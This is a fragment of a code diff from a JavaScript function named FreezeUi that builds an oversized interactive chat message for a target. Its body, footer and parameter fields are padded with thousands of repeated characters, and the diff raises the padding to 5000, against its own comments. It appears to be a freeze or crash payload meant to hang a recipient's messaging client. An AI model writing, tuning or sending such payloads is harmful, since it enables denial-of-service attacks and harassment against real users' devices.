@@ -53,8 +53,8 @@ async function FreezeUi(sock, target) {
                                             hasMediaAttachment: true,
                                             imageMessage: { /* same */ }
                                         },
-                                        body: { text: "⌁⃰ཀ" + "".repeat(1500) },     // 5000 → 1500
-                                        footer: { text: "".repeat(800) },
+                                        body: { text: "⌁⃰ཀ" + "".repeat(5000) },     // 5000 → 1500
+                                        footer: { text: "".repeat(5000) },
                                         nativeFlowMessage: {
                                             buttons: ButtonsFreeze,
                                             messageParamsJson: "[{".repeat(2000)   // 10000 → 2000
